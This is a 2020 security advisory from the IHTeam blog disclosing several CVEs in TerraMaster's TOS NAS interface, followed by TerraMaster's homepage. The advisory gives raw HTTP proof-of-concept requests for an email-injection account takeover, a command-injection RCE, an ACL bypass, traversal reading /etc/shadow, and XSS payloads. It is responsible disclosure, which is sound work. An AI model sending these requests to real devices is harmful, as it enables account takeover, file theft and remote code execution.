=== Content from www.ihteam.net_bb611acc_20250119_122640.html ===

[Skip to the content](#site-content)
[![IHTeam Security Blog](https://www.ihteam.net/wp-content/uploads/smlogo_2.png)](https://www.ihteam.net/)IHTeam Security Blog

Menu

* [Home](/)
* [Papers](https://www.ihteam.net/papers_tutorial/)

Close Menu

* [Home](/)
* [Papers](https://www.ihteam.net/papers_tutorial/)

Categories
[Advisories](https://www.ihteam.net/advisory/)
# TerraMaster TOS Multiple Vulnerabilities

* Post author

  By r00t
* Post date

  [12 December 2020](https://www.ihteam.net/advisory/terramaster-tos-multiple-vulnerabilities/)
* [2 Comments on TerraMaster TOS Multiple Vulnerabilities](https://www.ihteam.net/advisory/terramaster-tos-multiple-vulnerabilities/#comments)

TerraMaster is well known for producing data storage devices (NAS and DAS) since 2010. TOS is the name of their web interface to manage functionalities of the device.

The product is not new to security vulnerabilities, as Joshua M. of ISE highlighted back in 2018 (https://blog.securityevaluators.com/terramaster-nas-vulnerabilities-discovered-and-exploited-b8e5243e7a63).
In 2020, IHTeam performed a security review of the current TOS version 4.2.06 and identified the following:
CVE-2020-28184 – XSS
CVE-2020-28185 – User Enumeration
CVE-2020-28186 – Email Injection
CVE-2020-28187 – Directory Traversal
CVE-2020-28188 – Remote Command Execution
CVE-2020-28190 – Software Update Man-in-the-middle
CVE-2020-29189 – Incorrect Access Control

At the moment of writing Shodan has found around 1000 vulnerable TOS exposed on Internet – <https://www.shodan.io/search?query=X-Powered-By%3A+TerraMaster>

## **Account Takeover**

CVE-2020-28186 – The Forget Password functionality was found to be vulnerable to email injection, allowing an attacker to receive a verification code to a third-party email. This attack only works if the user specified a ‘Security email’ on the account.

The first step is to identify valid account (CVE-2020-28185) with security email set via:

`POST /wizard/initialise.php HTTP/1.1
Host: 192.168.1.206:8181
Content-Length: 28
Content-Type: application/x-www-form-urlencoded
Referer: http://192.168.1.206:8181

tab=checkuser&username=testaccount`

The response will look like the following:
`{"username":"testaccount","email":"[[email protected]](/cdn-cgi/l/email-protection)","status":1}`

We can now proceed requesting the password reset code via:

`POST /wizard/initialise.php HTTP/1.1
Host: 192.168.1.206:8181
Content-Length: 41
Accept: */*
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded
Origin: http://192.168.1.206:8181
Referer: http://192.168.1.206:8181/wizard/getpass.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

tab=validmail&email=<valid_user@email>,<attacker_controlled@email>`

Both user and attacker will receive the verification code thanks to email injection (comma separated emails); At this point we can validate the code (the cookie value must be lowercase):

`POST /wizard/initialise.php HTTP/1.1
Host: 192.168.1.206:8181
Content-Length: 25
Accept: /
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded
Origin: http://192.168.1.206:8181
Referer: http://192.168.1.206:8181/wizard/getpass.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: check_mail=frskzi
Connection: close

tab=checkcode&code=FrSkzI`

And finally reset the user’s password via:

`POST /wizard/initialise.php HTTP/1.1
Host: 192.168.1.206:8181
Content-Length: 82
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded
Origin: http://192.168.1.206:8181
Referer: http://192.168.1.206:8181/wizard/getpass.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: check_mail=frskzi
Connection: close

tab=checkpass&username=testaccount&email=<valid_user@email>&code=FrSkzI&passwd=NewPassw0rdH3r3`

## **Unauthenticated Remote Command Execution**

CVE-2020-28188
Vulnerable page: */include/makecvs.php*
Vulnerable parameter: *Event*

Proof of Concept:
`GET /tos/index.php?explorer/pathList&path=%60touch%20/tmp/file%60 HTTP/1.1
Host: 192.168.1.206:8181`

![](https://www.ihteam.net/wp-content/uploads/Touch_file.jpg)

Full exploit available at: <https://iht.li/paste.php?hash=UEUS>

## **Weak Access Control List**

CVE-2020-29189 – When a user is created, it could be placed within a group having read-only access to NAS folders. It was found that this option could be bypassed via the following request:

`POST /tos/index.php?explorer/pathChmod HTTP/1.1
Host: 192.168.1.206:8181
Content-Length: 162
Accept: */*
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded
Origin: http://192.168.1.206:8181
Referer: http://192.168.1.206:8181/tos/index.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=9ef919de5a6d2b17f5b6a5549e45495e; tos_visit_time=1604152180; kod_name=testaccount; noshow=1; kod_user_language=it-it
Connection: close

list=[{"type":"folder","path":"Volume%2520%25231%252Fpublic%252FISO%252F","userlist":"admin,testaccount,user,@admin,@allusers","right":"2,2,2,2,2","appmode":"0"}]`

The ‘right’ array refers to the ‘userlist’ array, therefore a value of ‘2’ will grand read/write access, instead of ‘1’ that only grants read access.

## **Directory Traversal**

CVE-2020-28187 – Instances of directory traversal leading to internal file system disclosure were identified. For example the following authenticated request can be performed to read the /etc/shadow file:

`GET /tos/index.php?editor/fileGet&filename=../../../../../../etc/shadow HTTP/1.1
Host: 192.168.1.206:8181
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=xxxxxxxxxxxx;
Connection: close`

The nginx web server was running with root privileges, that’s why it was possible to read the shadow file.

## **Cross-Site Scripting**

CVE-2020-28184
XSS via Host header on port 80 (unauthenticated)
`GET / HTTP/1.1
Host: 192.168.1.206'-alert(1)-'`

Via GET (authenticated)
`GET /module/index.php?mod=%2fusr%2fwww%2fmod%2f5.%22-alert(1)-%22 HTTP/1.1
Host: 192.168.1.206:8181`

## **Software update via insecure communication channel**

CVE-2020-28190 – In addition, software update and applications are checked and delivered via un-encrypted communication channel (HTTP):
`"AmazonS3":
{
"url":"http:\/\/dl.terra-master.com\/cn\/TOS7.0CJ\/AmazonS3.bz2"`

This behavior would allow man-in-the-middle attacks to successfully install malicious applications or updates.

## **Responsible Disclosure timeline:**

2 Nov 2020 – Details sent to TerraMaster Team and CVE request submitted
17 Nov 2020 – TerraMaster confirms that fixes will be implemented in version 4.2.07
3 Dec 2020 – TerraMaster releases TOS 4.2.07
9 Dec 2020 – IHTeam confirms issues were fixed in 4.2.07
12 Dec 2020 – IHTeam releases a public disclosure article

---

[←
DEFCON 28 – Safe mode](https://www.ihteam.net/hack-meet/defcon-28-safe-mode/)
[→
OnionShare 2.3 >= 2.3.3 Vulnerabilities](https://www.ihteam.net/advisory/onionshare/)

---

## 2 replies on “TerraMaster TOS Multiple Vulnerabilities”

![](https://secure.gravatar.com/avatar/53eaef94379535acdf3506a9c69be6cc?s=120&d=mm&r=g)Juniorsays:
[16 June 2022 at 12:59](https://www.ihteam.net/advisory/terramaster-tos-multiple-vulnerabilities/#comment-1471)

Congrats for your findings! I have a question about CVE-2020-28188. Is it the same as CVE-2020-35665? What is the difference?

In this article you say the vulnerable page is “/include/makecvs.php” and the vulnerable parameter is “Event”, but as a PoC you use “/tos/index.php?explorer/pathList&path=…”. In the exploit that you share you are only referencing the “makecvs” file. Is it a mistake?

Thanks!

[Reply](#comment-1471)

![](https://secure.gravatar.com/avatar/586f57e8e7bad3b0e6473a2038581861?s=120&d=mm&r=g)r00tsays:
[10 July 2022 at 16:19](https://www.ihteam.net/advisory/terramaster-tos-multiple-vulnerabilities/#comment-1472)

Hello, CVE-2020-35665 was created on the 22nd of December and based on a replica of our original exploit (released on 2nd of November).

CVEs can be requested by researchers at any time. MITRE won’t check for duplicates.

Regarding your question about the vulnerable path, they both are vulnerable to RCE, but “/include/makecvs.php?Event=” was instead used for the exploit.

In fact, there was also another path vulnerable to RCE (required auth): ajax/logtable.php

[Reply](#comment-1472)By Post Author

---

## Leave a Reply [Cancel reply](/advisory/terramaster-tos-multiple-vulnerabilities/#respond)

Your email address will not be published. Required fields are marked \*

Comment \*

Name \*

Email \*

Website

 Save my name, email, and website in this browser for the next time I comment.

Δ

This site uses Akismet to reduce spam. [Learn how your comment data is processed](https://akismet.com/privacy/).

©
2025 [IHTeam Security Blog](https://www.ihteam.net/)

[Powered by WordPress](https://en-gb.wordpress.org/)

[To the top ↑
Up ↑](#site-header)



=== Content from www.terra-master.com_63994f87_20250119_122642.html ===


**JavaScript seems to be disabled in your browser.**

You must have JavaScript enabled in your browser to utilize the functionality of this website.

 [![Terramaster Official Site](https://img.terra-master.com/skin/frontend/base/default/images/Terramaster_logo.svg) ![Terramaster Official Site](https://img.terra-master.com/skin/frontend/base/default/images/Terramaster_logo.svg)](https://www.terra-master.com/global/)

1. [PRODUCTS](https://www.terra-master.com/global/products.html)
   * [Home/SOHO NAS](https://www.terra-master.com/global/products/homesoho-nas.html)
   * [SMB NAS](https://www.terra-master.com/global/products/smallmedium-businesses-nas.html)
   * [Enterprise NAS](https://www.terra-master.com/global/products/enterprise-network-storage-server.html)
   * [Home/SOHO DAS](https://www.terra-master.com/global/products/homesoho-das.html)
   * [DAS for Video Editing](https://www.terra-master.com/global/products/video-professional-das.html)
   * [Accessories](https://www.terra-master.com/global/products/accessories.html)
2. [Support](https://www.terra-master.com/global/support/)
   * [Quick Installation Guide](https://support.terra-master.com/quickguide/)
   * [Video Guide](https://www.terra-master.com/global/video-guide/)
   * [TOS Help](https://toshelp.terra-master.com/web/#/en/desktop)
   * [FAQ](https://support.terra-master.com/faqs/tnas-faqs)
   * [DOWNLOAD](https://download.terra-master.com/?lng=en)
   * [Compatibility](https://www.terra-master.com/global/compatibility/)
   * [Register Product](https://www.terra-master.com/global/warranty/)
   * [Forum](https://forum.terra-master.com/en)
   * Live Chat
3. ABOUT US
   * [About TerraMaster](https://www.terra-master.com/global/about/)
   * [News](https://www.terra-master.com/global/press/)
   * [Awards](https://www.terra-master.com/global/awards/)
   * [HOT Deals](https://www.terra-master.com/global/deals)
   * [Blog](https://www.terra-master.com/global/blog)
   * [Customer Stories](https://www.terra-master.com/global/stories)
   * [Where to Buy](https://www.terra-master.com/global/reseller/)
   * [Contact Us](https://www.terra-master.com/global/contact-us/)
   * [Forum](http://forum.terra-master.com/en/)
   * [Become a Partner](https://www.terra-master.com/global/partner/)
4. [Forum](https://forum.terra-master.com/en/)
5. [Shop](https://shop.terra-master.com/%20)

 [Menu](#header-nav)

[0](https://www.terra-master.com/global/checkout/cart/)

Recently added item(s) ×

You have no items in your shopping cart.

[LOGIN](https://www.terra-master.com/global/customer/account/login/)

[English/Global](#lanfg)
[![](https://img.terra-master.com/media/global_lang.png)](#lanfg)
![](https://img.terra-master.com/media/qyyy.svg)
### Region & Language

* [English/Global](https://www.terra-master.com/global/)
* [English/US](https://www.terra-master.com/us/)
* [English/UK](https://www.terra-master.com/uk/)
* [Deutsch/Deutschland](https://www.terra-master.com/de/)

* [Français/France](https://www.terra-master.com/fr/)
* [Español/España](https://www.terra-master.com/es/)
* [Italiano/Italia](https://www.terra-master.com/it/)
* [简体中文/中国](https://www.terra-master.com/cn/)

* [日本語/日本](https://www.terra-master.com/jp/)
* [한국어/한국](https://www.terra-master.com/kr/)
* [Russian/Russia](https://www.terra-master.com/ru/)
* [Polish](https://www.terra-master.com/pl/)

[0](https://www.terra-master.com/global/checkout/cart/)

Recently added item(s) ×

You have no items in your shopping cart.

[LOGIN](https://www.terra-master.com/global/customer/account/login/)

* ![](https://img.terra-master.com/skin/frontend/base/default/nwdthemes/revslider/public/assets/images/transparent.png)

  ![](https://img.terra-master.com/media/revslider/mainfeature/happynewyear-778x960.jpg)

  ![](https://img.terra-master.com/media/revslider/mainfeature/happynewyear-640-920.jpg)

  ![](https://img.terra-master.com/media/revslider/mainfeature/happynewyear-1990.jpg)
* ![](https://img.terra-master.com/skin/frontend/base/default/nwdthemes/revslider/public/assets/images/transparent.png)

  ![](https://img.terra-master.com/media/revslider/mainfeature/tnasmobile-1990990.jpg)

  ![](https://img.terra-master.com/media/revslider/mainfeature/tnasmobile-640x920_3_.jpg)

  ![](https://img.terra-master.com/media/revslider/mainfeature/778x960-tnasm.jpg)

  TNAS Mobile 3

  Smarter NAS Management

  Upgraded Backup Experience for Mobile Devices

  Smarter NAS Management

  Upgraded Backup Experience for Mobile Devices

  Smarter NAS Management

  Smarter NAS Management

   with New Features
* ![](https://img.terra-master.com/skin/frontend/base/default/nwdthemes/revslider/public/assets/images/transparent.png)

  ![](https://img.terra-master.com/media/revslider/mainfeature/u4-500-778x960_2_1_.jpg)

  ![](https://img.terra-master.com/media/revslider/mainfeature/u4-500-640x920_2_1_.jpg)

  ![](https://img.terra-master.com/media/revslider/mainfeature/u4-500-1970.jpg)
* ![](https://img.terra-master.com/skin/frontend/base/default/nwdthemes/revslider/public/assets/images/transparent.png)

  ![](https://img.terra-master.com/media/revslider/mainfeature/yure.jpg)

  ![](https://img.terra-master.com/media/revslider/__ipad.jpg)

  ![](https://img.terra-master.com/media/revslider/mainfeature/__ip_1.jpg)

  2024 Fall New Product Lineup

  Powerful, Speedy and Quiet

  All Powered by TOS 6

  Powerful, Speedy and Quiet

  2024 Fall New Product Lineup

  All Powered by TOS 6
* ![](https://img.terra-master.com/skin/frontend/base/default/nwdthemes/revslider/public/assets/images/transparent.png)

[![](https://img.terra-master.com/media/wysiwyg/picture/bbstwo.jpg)](https://www.terra-master.com/global/bbs)

BBS

Business Backup Suite provides an integrated backup solution.

[![](https://img.terra-master.com/media/wysiwyg/picture/RAID_1_.jpg)](https://support.terra-master.com/raidcalculation/?lang=en)

What is TRAID?

Learn more about TRAID and TRAID+.

[![](https://img.terra-master.com/media/wysiwyg/picture/Hot-Deals.jpg)](https://www.terra-master.com/global/deals)

Hot Deals

Get the latest Deals Information of TerraMaster

[![](https://img.terra-master.com/media/wysiwyg/picture/TerraMaster_Parnter_Program.jpg)](https://www.terra-master.com/global/partner)

Partner Program

Welcome to Join the TerraMaster Partner Program

[![](https://img.terra-master.com/media/Banners/images/TOS-6-Banner-PC.jpg)](//www.youtube.com/embed/x7CzWrqM6DI?autoplay=1)
[![](https://img.terra-master.com/media/Banners/images/TOS-6_APP.jpg)](//www.youtube.com/embed/x7CzWrqM6DI?autoplay=1)

[Elevated Disk Array Management Solution
Higher Data Security for Professionals and Business users](https://www.terra-master.com/global/terramaster-traid)

![](https://img.terra-master.com/media/homebuilderone/wbfSvTRAID+_IP.jpg)

[Elevated Disk Array Management Solution
Higher Data Security for Professionals and Business users](https://www.terra-master.com/global/terramaster-traid)

**BECOME A TERRAMASTER INSIDER**

Sign up to receive exclusive offers and updates

- *\**Please type the letters below
- ![Reload captcha](https://img.terra-master.com/skin/frontend/base/default/images/reload.png)
  ![](https://img.terra-master.com/media/captcha/base/765572ffd486154b26af4b1e7c04c5d4.png)
SIGN UP

>
**SALES**

* [Home/SOHO NAS](https://www.terra-master.com/global/products/homesoho-nas.html)
* [SMB NAS](https://www.terra-master.com/global/products/smallmedium-businesses-nas.html)
* [Enterprise NAS](https://www.terra-master.com/global/products/enterprise-network-storage-server.html)
* [Home/SOHO DAS](https://www.terra-master.com/global/products/homesoho-das.html)
* [DAS for Video Editing](https://www.terra-master.com/global/products/video-professional-das.html)
* [TerraMaster OS - TOS](https://www.terra-master.com/global/alltos/)
* [Live Demo](https://www.terra-master.com/global/live-demo)
**SUPPORT**

* [Quick Installation Guide](https://start.terra-master.com/index.html?&lang=en-)
* [Download](https://download.terra-master.com/?lng=en)
* [Compatibility](https://www.terra-master.com/global/compatibility/)
* [Video Installation Guide](https://www.terra-master.com/global/video-guide/)
* [TOS Help](https://help.terra-master.com/TOS5/view/?lang/en-us)
* [FAQS](https://support.terra-master.com/faqs/tnas-faqs)
* [Register Product](//www.terra-master.com/global/warranty/)
* [Developer](//www.terra-master.com/global/developer/)
**About Us**

* [About TerraMaster](//www.terra-master.com/global/about/)
* [News](https://www.terra-master.com/global/press/)
* [Awards](https://www.terra-master.com/global/awards/)
* [HOT Deals](https://www.terra-master.com/global/deals)
* [Blog](https://www.terra-master.com/global/blog)
* [Customer Stories](https://www.terra-master.com/global/stories)
* [Where to Buy](https://www.terra-master.com/global/reseller/)
* [Contact Us](https://www.terra-master.com/global/contact-us/)
* [Forum](http://forum.terra-master.com/en/)
* [Become a Partner](//www.terra-master.com/global/partner/)
**Terms**

* [Warranty And Return](//www.terra-master.com/global/warranty-returns/)
* [Shipping Policies](https://www.terra-master.com/global/shipping-policy/)
* [Terms And Conditions](//www.terra-master.com/global/clause/)
* [Privacy Statement](//www.terra-master.com/global/privacy/)
* [GPL Sources](https://www.terra-master.com/global/gplsource/)
* [EULA](https://www.terra-master.com/global/eula/)

* [![facebook""](https://img.terra-master.com/media/wysiwyg/fb-icon.png)](https://www.facebook.com/terramasterofficial/)
* [![Twitter](https://img.terra-master.com/media/wysiwyg/twt-icon.png)](https://twitter.com/terramasters)
* [![Instagram](https://img.terra-master.com/media/wysiwyg/youtube_icon.png)](https://www.youtube.com/channel/UC2x557lLdd_OM5mqQZhW-4Q)
* [![Youtube](https://img.terra-master.com/media/wysiwyg/insta_icon.png)](https://www.instagram.com/terramasterofficial/)

Cookies help us improve the user experience. By using our services, you agree to our use of cookies.

OK


